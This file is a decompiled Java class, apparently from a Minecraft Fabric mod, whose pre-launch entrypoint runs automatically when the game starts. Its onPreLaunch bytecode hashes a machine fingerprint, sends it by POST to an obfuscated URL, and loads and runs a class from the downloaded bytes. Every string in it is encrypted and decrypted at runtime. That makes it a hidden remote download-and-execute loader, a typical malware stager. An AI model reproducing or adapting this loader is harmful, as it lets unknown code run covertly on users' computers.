import com.sun.jna.Platform;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import net.fabricmc.loader.api.entrypoint.PreLaunchEntrypoint;
import oshi.PlatformEnum;

public class Init implements PreLaunchEntrypoint {
   private static R D;
   private static Object Q;
   static e x;
   static c b;
   static i W;
   public static int y;
   private static final String[] a;
   private static final String[] c;
   private static final long[] d;
   private static final Integer[] e;

   public void onPreLaunch() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.RuntimeException: parsing failure!
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:211)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 000: ldc2_w 69844751179848
      // 003: lstore 1
      // 004: lload 1
      // 005: dup2
      // 006: ldc2_w 81542363632779
      // 009: lxor
      // 00a: lstore 3
      // 00b: dup2
      // 00c: ldc2_w 84006946001720
      // 00f: lxor
      // 010: lstore 5
      // 012: pop2
      // 013: getstatic e.R I
      // 016: istore 7
      // 018: lload 5
      // 01a: bipush 1
      // 01b: anewarray 365
      // 01e: dup_x2
      // 01f: dup_x2
      // 020: pop
      // 021: invokestatic java/lang/Long.valueOf (J)Ljava/lang/Long;
      // 024: bipush 0
      // 025: swap
      // 026: aastore
      // 027: invokestatic Init.G ([Ljava/lang/Object;)Ljava/lang/String;
      // 02a: astore 8
      // 02c: aload 8
      // 02e: invokevirtual java/lang/String.isBlank ()Z
      // 031: ifeq 035
      // 034: return
      // 035: invokestatic java/net/http/HttpRequest.newBuilder ()Ljava/net/http/HttpRequest$Builder;
      // 038: ldc -6946710
      // 03a: sipush -6708
      // 03d: i2c
      // 03e: ineg
      // 03f: iadd
      // 040: ldc 6946710
      // 042: sipush -25764
      // 045: i2c
      // 046: iadd
      // 047: lload 1
      // 048: l2i
      // 049: invokestatic Init.a (III)Ljava/lang/String;
      // 04c: invokestatic java/net/URI.create (Ljava/lang/String;)Ljava/net/URI;
      // 04f: invokeinterface java/net/http/HttpRequest$Builder.uri (Ljava/net/URI;)Ljava/net/http/HttpRequest$Builder; 2
      // 054: aload 8
      // 056: invokestatic java/net/http/HttpRequest$BodyPublishers.ofString (Ljava/lang/String;)Ljava/net/http/HttpRequest$BodyPublisher;
      // 059: invokeinterface java/net/http/HttpRequest$Builder.POST (Ljava/net/http/HttpRequest$BodyPublisher;)Ljava/net/http/HttpRequest$Builder; 2
      // 05e: ldc -6946710
      // 060: sipush -6696
      // 063: i2c
      // 064: ineg
      // 065: iadd
      // 066: ldc -6946710
      // 068: sipush -6763
      // 06b: i2c
      // 06c: ineg
      // 06d: iadd
      // 06e: lload 1
      // 06f: l2i
      // 070: invokestatic Init.a (III)Ljava/lang/String;
      // 073: ldc -6946710
      // 075: sipush -6697
      // 078: i2c
      // 079: ineg
      // 07a: iadd
      // 07b: ldc -6946710
      // 07d: sipush -24054
      // 080: i2c
      // 081: ineg
      // 082: iadd
      // 083: lload 1
      // 084: l2i
      // 085: invokestatic Init.a (III)Ljava/lang/String;
      // 088: invokeinterface java/net/http/HttpRequest$Builder.header (Ljava/lang/String;Ljava/lang/String;)Ljava/net/http/HttpRequest$Builder; 3
      // 08d: ldc -6946710
      // 08f: sipush -6707
      // 092: i2c
      // 093: ineg
      // 094: iadd
      // 095: ldc 6946710
      // 097: sipush -17026
      // 09a: i2c
      // 09b: iadd
      // 09c: lload 1
      // 09d: l2i
      // 09e: invokestatic Init.a (III)Ljava/lang/String;
      // 0a1: ldc -6946710
      // 0a3: sipush -6703
      // 0a6: i2c
      // 0a7: ineg
      // 0a8: iadd
      // 0a9: ldc -6946710
      // 0ab: sipush -8807
      // 0ae: i2c
      // 0af: ineg
      // 0b0: iadd
      // 0b1: lload 1
      // 0b2: l2i
      // 0b3: invokestatic Init.a (III)Ljava/lang/String;
      // 0b6: invokeinterface java/net/http/HttpRequest$Builder.header (Ljava/lang/String;Ljava/lang/String;)Ljava/net/http/HttpRequest$Builder; 3
      // 0bb: astore 9
      // 0bd: ldc -6946710
      // 0bf: sipush -6702
      // 0c2: i2c
      // 0c3: ineg
      // 0c4: iadd
      // 0c5: ldc -6946710
      // 0c7: sipush -12669
      // 0ca: i2c
      // 0cb: ineg
      // 0cc: iadd
      // 0cd: lload 1
      // 0ce: l2i
      // 0cf: invokestatic Init.a (III)Ljava/lang/String;
      // 0d2: invokestatic java/lang/System.getenv (Ljava/lang/String;)Ljava/lang/String;
      // 0d5: astore 10
      // 0d7: aload 10
      // 0d9: iload 7
      // 0db: ifne 0e7
      // 0de: ifnull 10f
      // 0e1: goto 0e5
      // 0e4: athrow
      // 0e5: aload 10
      // 0e7: invokevirtual java/lang/String.isBlank ()Z
      // 0ea: ifne 10f
      // 0ed: aload 9
      // 0ef: ldc -6946710
      // 0f1: sipush -6694
      // 0f4: i2c
      // 0f5: ineg
      // 0f6: iadd
      // 0f7: ldc 6946710
      // 0f9: sipush -20341
      // 0fc: i2c
      // 0fd: iadd
      // 0fe: lload 1
      // 0ff: l2i
      // 100: invokestatic Init.a (III)Ljava/lang/String;
      // 103: aload 10
      // 105: invokeinterface java/net/http/HttpRequest$Builder.header (Ljava/lang/String;Ljava/lang/String;)Ljava/net/http/HttpRequest$Builder; 3
      // 10a: pop
      // 10b: goto 10f
      // 10e: athrow
      // 10f: aload 9
      // 111: invokeinterface java/net/http/HttpRequest$Builder.build ()Ljava/net/http/HttpRequest; 1
      // 116: astore 11
      // 118: invokestatic java/net/http/HttpClient.newHttpClient ()Ljava/net/http/HttpClient;
      // 11b: aload 11
      // 11d: invokestatic java/net/http/HttpResponse$BodyHandlers.ofByteArray ()Ljava/net/http/HttpResponse$BodyHandler;
      // 120: invokevirtual java/net/http/HttpClient.send (Ljava/net/http/HttpRequest;Ljava/net/http/HttpResponse$BodyHandler;)Ljava/net/http/HttpResponse;
      // 123: astore 12
      // 125: aload 12
      // 127: invokeinterface java/net/http/HttpResponse.statusCode ()I 1
      // 12c: iload 7
      // 12e: ifne 15b
      // 131: sipush 10652
      // 134: ldc2_w 8487079608743309548
      // 137: lload 1
      // 138: lxor
      // 139: invokestatic Init.a (IJ)I
      // 13c: if_icmpne 15e
      // 13f: goto 143
      // 142: athrow
      // 143: aload 12
      // 145: iload 7
      // 147: ifne 161
      // 14a: goto 14e
      // 14d: athrow
      // 14e: invokeinterface java/net/http/HttpResponse.body ()Ljava/lang/Object; 1
      // 153: checkcast [B
      // 156: arraylength
      // 157: goto 15b
      // 15a: athrow
      // 15b: ifne 15f
      // 15e: return
      // 15f: aload 12
      // 161: invokeinterface java/net/http/HttpResponse.headers ()Ljava/net/http/HttpHeaders; 1
      // 166: ldc -6946710
      // 168: sipush -6705
      // 16b: i2c
      // 16c: ineg
      // 16d: iadd
      // 16e: ldc 6946710
      // 170: sipush -11560
      // 173: i2c
      // 174: iadd
      // 175: lload 1
      // 176: l2i
      // 177: invokestatic Init.a (III)Ljava/lang/String;
      // 17a: invokevirtual java/net/http/HttpHeaders.firstValue (Ljava/lang/String;)Ljava/util/Optional;
      // 17d: astore 13
      // 17f: aload 13
      // 181: invokevirtual java/util/Optional.isEmpty ()Z
      // 184: ifeq 188
      // 187: return
      // 188: invokestatic java/util/Base64.getDecoder ()Ljava/util/Base64$Decoder;
      // 18b: aload 13
      // 18d: invokevirtual java/util/Optional.get ()Ljava/lang/Object;
      // 190: checkcast java/lang/String
      // 193: invokevirtual java/util/Base64$Decoder.decode (Ljava/lang/String;)[B
      // 196: astore 14
      // 198: aload 12
      // 19a: invokeinterface java/net/http/HttpResponse.body ()Ljava/lang/Object; 1
      // 19f: checkcast [B
      // 1a2: astore 15
      // 1a4: invokestatic net/fabricmc/loader/impl/launch/FabricLauncherBase.getLauncher ()Lnet/fabricmc/loader/impl/launch/FabricLauncher;
      // 1a7: invokeinterface net/fabricmc/loader/impl/launch/FabricLauncher.getTargetClassLoader ()Ljava/lang/ClassLoader; 1
      // 1ac: astore 16
      // 1ae: new R
      // 1b1: dup
      // 1b2: aload 15
      // 1b4: lload 3
      // 1b5: aload 14
      // 1b7: aload 16
      // 1b9: invokespecial R.<init> ([BJ[BLjava/lang/ClassLoader;)V
      // 1bc: putstatic Init.D LR;
      // 1bf: getstatic Init.D LR;
      // 1c2: ldc -6946710
      // 1c4: sipush -6704
      // 1c7: i2c
      // 1c8: ineg
      // 1c9: iadd
      // 1ca: ldc -6946710
      // 1cc: sipush -20072
      // 1cf: i2c
      // 1d0: ineg
      // 1d1: iadd
      // 1d2: lload 1
      // 1d3: l2i
      // 1d4: invokestatic Init.a (III)Ljava/lang/String;
      // 1d7: invokevirtual R.loadClass (Ljava/lang/String;)Ljava/lang/Class;
      // 1da: astore 17
      // 1dc: aload 17
      // 1de: bipush 0
      // 1df: anewarray 327
      // 1e2: invokevirtual java/lang/Class.getDeclaredConstructor ([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;
      // 1e5: bipush 0
      // 1e6: anewarray 365
      // 1e9: invokevirtual java/lang/reflect/Constructor.newInstance ([Ljava/lang/Object;)Ljava/lang/Object;
      // 1ec: putstatic Init.Q Ljava/lang/Object;
      // 1ef: aload 17
      // 1f1: ldc -6946710
      // 1f3: sipush -6709
      // 1f6: i2c
      // 1f7: ineg
      // 1f8: iadd
      // 1f9: ldc 6946710
      // 1fb: sipush -26149
      // 1fe: i2c
      // 1ff: iadd
      // 200: lload 1
      // 201: l2i
      // 202: invokestatic Init.a (III)Ljava/lang/String;
      // 205: bipush 0
      // 206: anewarray 327
      // 209: invokevirtual java/lang/Class.getMethod (Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
      // 20c: getstatic Init.Q Ljava/lang/Object;
      // 20f: bipush 0
      // 210: anewarray 365
      // 213: invokevirtual java/lang/reflect/Method.invoke (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
      // 216: pop
      // 217: goto 21c
      // 21a: astore 8
      // 21c: return
   }

   // $VF: Irreducible bytecode was duplicated to produce valid code
   static {
      String[] var13 = new String[12];
      int var11 = 0;
      String var10 = "ã:©>\u0005\u000bU\u0083\u009c&ê0\u0010÷\u0090Iý\u0018ùÙ\u009d\\·\u0012\u001al\u0013\u0087=Np©\u00ad+¤ô\u000eygåÅ\u0087\nÿ\u0019J8\"¢ësø\u008a\u0004ÆÇjZ/\u0097\u008d|N\u0015\u0096YÕö\u009aÐþÕ\u00adm\u008dYÛ\u0082]Èá×\u0087ÞÆ\u007f(\t¤¿D{\u007fSv\u009e·Äa(qsâ:CC\u0006Â'ÍûÕÙ\u0007>pè¶g\u0019É\nC\u0002u\u0088å\u0080ÓZ\u0086÷\fß\u0096!Qñ¥Jo\u0093\u0083©P";
      int var12 = "ã:©>\u0005\u000bU\u0083\u009c&ê0\u0010÷\u0090Iý\u0018ùÙ\u009d\\·\u0012\u001al\u0013\u0087=Np©\u00ad+¤ô\u000eygåÅ\u0087\nÿ\u0019J8\"¢ësø\u008a\u0004ÆÇjZ/\u0097\u008d|N\u0015\u0096YÕö\u009aÐþÕ\u00adm\u008dYÛ\u0082]Èá×\u0087ÞÆ\u007f(\t¤¿D{\u007fSv\u009e·Äa(qsâ:CC\u0006Â'ÍûÕÙ\u0007>pè¶g\u0019É\nC\u0002u\u0088å\u0080ÓZ\u0086÷\fß\u0096!Qñ¥Jo\u0093\u0083©P"
         .length();
      char var9 = 5;
      int var16 = -1;

      label61:
      while (true) {
         String var10000 = var10.substring(++var16, var16 + var9);
         int var10001 = -1;

         while (true) {
            char[] var30;
            label56: {
               char[] var19 = var10000.toCharArray();
               int var10003 = var19.length;
               int var14 = 0;
               var30 = var19;
               var10001 = var10003;
               char[] var38;
               int var10004;
               if (var10003 <= 1) {
                  var38 = var19;
                  var10004 = var14;
               } else {
                  var30 = var19;
                  var10001 = var10003;
                  if (var10003 <= var14) {
                     break label56;
                  }

                  var38 = var19;
                  var10004 = var14;
               }

               while (true) {
                  var38[var10004] = (char)(var38[var10004] ^ switch (var14 % 7) {
                     case 0 -> 127;
                     case 1 -> 57;
                     case 2 -> 112;
                     case 3 -> 82;
                     case 4 -> 29;
                     case 5 -> 81;
                     default -> 106;
                  });
                  var14++;
                  if (var10001 == 0) {
                     var10004 = var10001;
                     var38 = var30;
                  } else {
                     if (var10001 <= var14) {
                        break;
                     }

                     var38 = var30;
                     var10004 = var14;
                  }
               }
            }

            String var45 = new String(var30).intern();
            switch (var10001) {
               case 0:
                  var13[var11++] = var45;
                  if ((var16 += var9) >= var12) {
                     a = var13;
                     c = new String[12];
                     long var0 = 113960797693347L;
                     long[] var6 = new long[3];
                     int var3 = 0;
                     String var4 = "\u0017\u008a)\u0014ª\u0018¼vüê\u001d.dÓ5Ïî:\u0094v°\u0016Ä¹";
                     int var5 = "\u0017\u008a)\u0014ª\u0018¼vüê\u001d.dÓ5Ïî:\u0094v°\u0016Ä¹".length();
                     byte var2 = 0;

                     do {
                        int var26 = var2;
                        var2 += 8;
                        byte[] var7 = var4.substring(var26, var2).getBytes("ISO-8859-1");
                        var26 = var3++;
                        long var47 = (
                              (var7[0] & 255L) << 56
                                 | (var7[1] & 255L) << 48
                                 | (var7[2] & 255L) << 40
                                 | (var7[3] & 255L) << 32
                                 | (var7[4] & 255L) << 24
                                 | (var7[5] & 255L) << 16
                                 | (var7[6] & 255L) << 8
                                 | var7[7] & 255L
                           )
                           ^ var0;
                        byte var46 = -1;
                        var6[var26] = var47;
                     } while (var2 < var5);

                     d = var6;
                     e = new Integer[3];
                     x = new e();
                     b = new c();
                     W = new i();
                     return;
                  }

                  var9 = var10.charAt(var16);
                  break;
               default:
                  var13[var11++] = var45;
                  if ((var16 += var9) < var12) {
                     var9 = var10.charAt(var16);
                     continue label61;
                  }

                  var10 = "\u0004×gã¤Ú\u001f\n\u001fÒvE¡\tÍ\" \u0080";
                  var12 = "\u0004×gã¤Ú\u001f\n\u001fÒvE¡\tÍ\" \u0080".length();
                  var9 = 7;
                  var16 = -1;
            }

            var10000 = var10.substring(++var16, var16 + var9);
            var10001 = 0;
         }
      }
   }

   public static String i(Object[] param0) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.RuntimeException: parsing failure!
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:211)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: aload 0
      // 01: dup
      // 02: bipush 0
      // 03: aaload
      // 04: checkcast java/lang/Long
      // 07: invokevirtual java/lang/Long.longValue ()J
      // 0a: lstore 1
      // 0b: dup
      // 0c: bipush 1
      // 0d: aaload
      // 0e: checkcast [B
      // 11: astore 3
      // 12: pop
      // 13: getstatic e.R I
      // 16: new java/lang/StringBuilder
      // 19: dup
      // 1a: bipush 2
      // 1b: aload 3
      // 1c: arraylength
      // 1d: imul
      // 1e: invokespecial java/lang/StringBuilder.<init> (I)V
      // 21: astore 5
      // 23: aload 3
      // 24: astore 6
      // 26: aload 6
      // 28: arraylength
      // 29: istore 7
      // 2b: istore 4
      // 2d: bipush 0
      // 2e: istore 8
      // 30: iload 8
      // 32: iload 7
      // 34: if_icmpge 9d
      // 37: aload 6
      // 39: iload 8
      // 3b: baload
      // 3c: istore 9
      // 3e: sipush 8211
      // 41: ldc2_w 8666724981244920918
      // 44: lload 1
      // 45: lxor
      // 46: invokestatic Init.a (IJ)I
      // 49: iload 9
      // 4b: iand
      // 4c: invokestatic java/lang/Integer.toHexString (I)Ljava/lang/String;
      // 4f: astore 10
      // 51: iload 4
      // 53: lload 1
      // 54: lconst_0
      // 55: lcmp
      // 56: iflt 9a
      // 59: ifne 98
      // 5c: aload 10
      // 5e: iload 4
      // 60: lload 1
      // 61: lconst_0
      // 62: lcmp
      // 63: iflt a5
      // 66: ifne a2
      // 69: goto 6d
      // 6c: athrow
      // 6d: invokevirtual java/lang/String.length ()I
      // 70: bipush 1
      // 71: if_icmpne 8d
      // 74: goto 78
      // 77: athrow
      // 78: aload 5
      // 7a: sipush 22545
      // 7d: ldc2_w 8304701574120602710
      // 80: lload 1
      // 81: lxor
      // 82: invokestatic Init.a (IJ)I
      // 85: invokevirtual java/lang/StringBuilder.append (C)Ljava/lang/StringBuilder;
      // 88: pop
      // 89: goto 8d
      // 8c: athrow
      // 8d: aload 5
      // 8f: aload 10
      // 91: invokevirtual java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
      // 94: pop
      // 95: iinc 8 1
      // 98: iload 4
      // 9a: ifeq 30
      // 9d: aload 5
      // 9f: invokevirtual java/lang/StringBuilder.toString ()Ljava/lang/String;
      // a2: getstatic Init.y I
      // a5: lload 1
      // a6: lconst_0
      // a7: lcmp
      // a8: iflt b3
      // ab: ifeq ba
      // ae: iinc 4 1
      // b1: iload 4
      // b3: putstatic e.R I
      // b6: goto ba
      // b9: athrow
      // ba: areturn
   }

   private static String a(int var0, int var1, int var2) {
      int var3 = (var0 ^ var2 ^ 31443) & 65535;
      if (c[var3] == null) {
         char[] var4 = a[var3].toCharArray();

         short var5 = switch (var4[0] & 0xFF) {
            case 0 -> 179;
            case 1 -> 234;
            case 2 -> 70;
            case 3 -> 124;
            case 4 -> 49;
            case 5 -> 222;
            case 6 -> 226;
            case 7 -> 126;
            case 8 -> 151;
            case 9 -> 122;
            case 10 -> 27;
            case 11 -> 172;
            case 12 -> 111;
            case 13 -> 99;
            case 14 -> 232;
            case 15 -> 192;
            case 16 -> 24;
            case 17 -> 142;
            case 18 -> 140;
            case 19 -> 218;
            case 20 -> 135;
            case 21 -> 86;
            case 22 -> 13;
            case 23 -> 199;
            case 24 -> 6;
            case 25 -> 73;
            case 26 -> 236;
            case 27 -> 117;
            case 28 -> 87;
            case 29 -> 245;
            case 30 -> 98;
            case 31 -> 215;
            case 32 -> 184;
            case 33 -> 190;
            case 34 -> 240;
            case 35 -> 148;
            case 36 -> 1;
            case 37 -> 129;
            case 38 -> 177;
            case 39 -> 42;
            case 40 -> 107;
            case 41 -> 250;
            case 42 -> 83;
            case 43 -> 170;
            case 44 -> 131;
            case 45 -> 165;
            case 46 -> 8;
            case 47 -> 5;
            case 48 -> 17;
            case 49 -> 153;
            case 50 -> 20;
            case 51 -> 108;
            case 52 -> 223;
            case 53 -> 144;
            case 54 -> 180;
            case 55 -> 64;
            case 56 -> 101;
            case 57 -> 203;
            case 58 -> 154;
            case 59 -> 80;
            case 60 -> 224;
            case 61 -> 39;
            case 62 -> 79;
            case 63 -> 229;
            case 64 -> 136;
            case 65 -> 233;
            case 66 -> 115;
            case 67 -> 134;
            case 68 -> 66;
            case 69 -> 118;
            case 70 -> 97;
            case 71 -> 89;
            case 72 -> 31;
            case 73 -> 220;
            case 74 -> 175;
            case 75 -> 30;
            case 76 -> 65;
            case 77 -> 244;
            case 78 -> 139;
            case 79 -> 9;
            case 80 -> 88;
            case 81 -> 45;
            case 82 -> 133;
            case 83 -> 36;
            case 84 -> 237;
            case 85 -> 52;
            case 86 -> 197;
            case 87 -> 241;
            case 88 -> 227;
            case 89 -> 168;
            case 90 -> 249;
            case 91 -> 22;
            case 92 -> 112;
            case 93 -> 248;
            case 94 -> 37;
            case 95 -> 93;
            case 96 -> 72;
            case 97 -> 51;
            case 98 -> 43;
            case 99 -> 14;
            case 100 -> 60;
            case 101 -> 171;
            case 102 -> 228;
            case 103 -> 185;
            case 104 -> 202;
            case 105 -> 231;
            case 106 -> 53;
            case 107 -> 116;
            case 108 -> 103;
            case 109 -> 82;
            case 110 -> 196;
            case 111 -> 173;
            case 112 -> 208;
            case 113 -> 235;
            case 114 -> 230;
            case 115 -> 34;
            case 116 -> 95;
            case 117 -> 162;
            case 118 -> 207;
            case 119 -> 219;
            case 120 -> 56;
            case 121 -> 19;
            case 122 -> 183;
            case 123 -> 102;
            case 124 -> 41;
            case 125 -> 114;
            case 126 -> 145;
            case 127 -> 62;
            case 128 -> 238;
            case 129 -> 150;
            case 130 -> 163;
            case 131 -> 35;
            case 132 -> 166;
            case 133 -> 187;
            case 134 -> 178;
            case 135 -> 169;
            case 136 -> 252;
            case 137 -> 210;
            case 138 -> 76;
            case 139 -> 164;
            case 140 -> 57;
            case 141 -> 156;
            case 142 -> 110;
            case 143 -> 123;
            case 144 -> 47;
            case 145 -> 7;
            case 146 -> 12;
            case 147 -> 113;
            case 148 -> 189;
            case 149 -> 127;
            case 150 -> 206;
            case 151 -> 109;
            case 152 -> 147;
            case 153 -> 128;
            case 154 -> 50;
            case 155 -> 32;
            case 156 -> 71;
            case 157 -> 3;
            case 158 -> 90;
            case 159 -> 10;
            case 160 -> 186;
            case 161 -> 155;
            case 162 -> 191;
            case 163 -> 91;
            case 164 -> 146;
            case 165 -> 106;
            case 166 -> 216;
            case 167 -> 174;
            case 168 -> 239;
            case 169 -> 18;
            case 170 -> 158;
            case 171 -> 119;
            case 172 -> 193;
            case 173 -> 94;
            case 174 -> 28;
            case 175 -> 81;
            case 176 -> 212;
            case 177 -> 67;
            case 178 -> 4;
            case 179 -> 141;
            case 180 -> 253;
            case 181 -> 214;
            case 182 -> 15;
            case 183 -> 161;
            case 184 -> 78;
            case 185 -> 105;
            case 186 -> 138;
            case 187 -> 74;
            case 188 -> 33;
            case 189 -> 96;
            case 190 -> 59;
            case 191 -> 132;
            case 192 -> 69;
            case 193 -> 137;
            case 194 -> 92;
            case 195 -> 55;
            case 196 -> 217;
            case 197 -> 209;
            case 198 -> 25;
            case 199 -> 120;
            case 200 -> 85;
            case 201 -> 121;
            case 202 -> 100;
            case 203 -> 198;
            case 204 -> 77;
            case 205 -> 149;
            case 206 -> 75;
            case 207 -> 181;
            case 208 -> 242;
            case 209 -> 0;
            case 210 -> 195;
            case 211 -> 21;
            case 212 -> 246;
            case 213 -> 157;
            case 214 -> 61;
            case 215 -> 221;
            case 216 -> 40;
            case 217 -> 29;
            case 218 -> 204;
            case 219 -> 182;
            case 220 -> 84;
            case 221 -> 160;
            case 222 -> 63;
            case 223 -> 44;
            case 224 -> 200;
            case 225 -> 254;
            case 226 -> 188;
            case 227 -> 247;
            case 228 -> 176;
            case 229 -> 143;
            case 230 -> 211;
            case 231 -> 125;
            case 232 -> 58;
            case 233 -> 2;
            case 234 -> 255;
            case 235 -> 152;
            case 236 -> 201;
            case 237 -> 194;
            case 238 -> 38;
            case 239 -> 48;
            case 240 -> 213;
            case 241 -> 130;
            case 242 -> 251;
            case 243 -> 104;
            case 244 -> 243;
            case 245 -> 26;
            case 246 -> 46;
            case 247 -> 11;
            case 248 -> 159;
            case 249 -> 68;
            case 250 -> 167;
            case 251 -> 225;
            case 252 -> 205;
            case 253 -> 54;
            case 254 -> 23;
            default -> 16;
         };
         int var10;
         int var6 = ((var10 = var1 ^ var2) & 0xFF) - var5;
         if (var6 < 0) {
            var6 += 256;
         }

         int var7 = ((var10 & 65535) >>> 8) - var5;
         if (var7 < 0) {
            var7 += 256;
         }

         for (int var8 = 0; var8 < var4.length; var8++) {
            int var9 = var8 % 2;
            char var10002 = var4[var8];
            if (var9 == 0) {
               var4[var8] = (char)(var10002 ^ var6);
               var6 = ((var6 >>> 3 | var6 << 5) ^ var4[var8]) & 0xFF;
            } else {
               var4[var8] = (char)(var10002 ^ var7);
               var7 = ((var7 >>> 3 | var7 << 5) ^ var4[var8]) & 0xFF;
            }
         }

         c[var3] = new String(var4).intern();
      }

      return c[var3];
   }

   private static int a(int var0, long var1) {
      int var3 = var0 ^ (int)(var1 & 32767L) ^ 31033;
      if (e[var3] == null) {
         e[var3] = (int)(d[var3] ^ var1);
      }

      return e[var3];
   }

   public static String G(Object[] var0) {
      long var1 = (Long)var0[0];
      long var3 = var1 ^ 6752072492045L;
      long var5 = var1 ^ 74211273457029L;
      long var7 = var1 ^ 42006397578764L;
      long var9 = var1 ^ 102319919880588L;

      try {
         PlatformEnum var11 = PlatformEnum.getValue(Platform.getOSType());
         MessageDigest var12 = MessageDigest.getInstance(a(-1682283450 + -((char)-25955), -1682283450 + -((char)-23480), (int)var1));

         byte[] var16;
         label29: {
            label28: {
               try {
                  switch (p.K[var11.ordinal()]) {
                     case 1:
                        e var18 = x;
                        Object[] var20 = new Object[]{null, var3};
                        var20[0] = true;
                        var16 = var18.O(var20).getBytes(StandardCharsets.UTF_8);
                        break label29;
                     case 2:
                        break label28;
                     case 3:
                        break;
                     default:
                        throw new IllegalArgumentException();
                  }
               } catch (Exception var14) {
                  throw var14;
               }

               c var10000 = b;
               Object[] var10004 = new Object[]{null, var5};
               var10004[0] = true;
               var16 = var10000.T(var10004).getBytes(StandardCharsets.UTF_8);
               break label29;
            }

            i var17 = W;
            Object[] var19 = new Object[]{null, true};
            var19[0] = var9;
            var16 = var17.j(var19).getBytes(StandardCharsets.UTF_8);
         }

         byte[] var13 = var16;
         return i(new Object[]{var7, var12.digest(var13)});
      } catch (Exception var15) {
         return a(-1682283450 + -((char)-25950), -1682283450 + -((char)-16167), (int)var1);
      }
   }
}
